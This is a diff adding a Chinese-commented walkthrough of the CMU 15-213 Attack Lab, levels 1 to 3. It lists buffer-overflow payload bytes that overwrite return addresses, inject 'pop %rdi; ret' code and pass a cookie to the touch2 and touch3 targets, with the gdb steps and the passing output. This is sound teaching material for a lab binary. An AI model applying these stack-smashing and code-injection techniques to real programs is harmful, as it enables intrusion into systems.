@@ -23,7 +23,8 @@
 00000000004017c0 <touch1>:
 
 # 所以先填充40个字节，然后再填入touch1()函数地址即可
-# 尝试 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 c0 17 40 00 00 00 00 00
+# 尝试 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30
+c0 17 40 00 00 00 00 00
 # 成功
 
 Cookie: 0x59b997fa
@@ -36,3 +37,94 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:ctarget:1:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 C0 17 40 00 00 00 00 00
 
 # level 2
+# 这里要求getbuf()函数返回到touch2，而且要将cookie作为参数传入touch2
+# 所以需要把原来的返回地址覆盖为插入代码的地址，插入代码应该是
+# pop %rdi
+# ret
+
+# 使用如下指令获得机器码：
+
+unix> gcc -c example.s
+unix> objdump -d example.o > example.d
+
+# 得到机器码如下
+
+   0:	5f                   	pop    %rdi
+   1:	c3                   	ret
+
+# 获得touch2()地址
+
+00000000004017ec <touch2>:
+
+# 获得调用getbuf()的函数的栈顶地址
+
+./hex2raw < input_1.txt > input_1-raw.txt
+(gdb) r -i input_1-raw.txt -q
+(gdb) p/x $rsp
+$1 = 0x5561dca0
+
+# 拼凑字节
+
+/* 填缓存区 */
+30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30
+/* 攻击代码地址 */
+b8 dc 61 55 00 00 00 00
+/* 设置cookie值 */
+fa 97 b9 59 00 00 00 00
+/* touch2()函数地址 */
+ec 17 40 00 00 00 00 00
+/* pop */
+5f
+/* ret指令 */
+c3
+
+# 通过
+
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:2:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 B8 DC 61 55 00 00 00 00 FA 97 B9 59 00 00 00 00 EC 17 40 00 00 00 00 00 5F C3 
+
+# Level 3
+
+# 这里就是让返回到touch3，传入参数%rdi要指向cookie字符串
+# Cookie 0x59b997fa对应ASCII字符串 35 39 62 39 39 37 66 61
+
+# 获得touch3()地址
+
+00000000004018fa <touch3>:
+
+# 由于将代码往上填一直不通过，尝试把代码放到getbuf缓存区里面
+
+# 拼凑字节
+
+/* pop %rdi */
+5f
+/* ret */
+c3
+/* cookie */
+35 39 62 39 39 37 66 61 00
+/* 填缓存区 */
+30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30
+/* 攻击代码地址 */
+78 dc 61 55 00 00 00 00
+/* cookie ASCII 地址 */
+7a dc 61 55 00 00 00 00
+/* touch3()函数地址 */
+fa 18 40 00 00 00 00 00
+
+# 通过
+
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:3:5F C3 35 39 62 39 39 37 66 61 00 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 78 DC 61 55 00 00 00 00 7A DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00
+
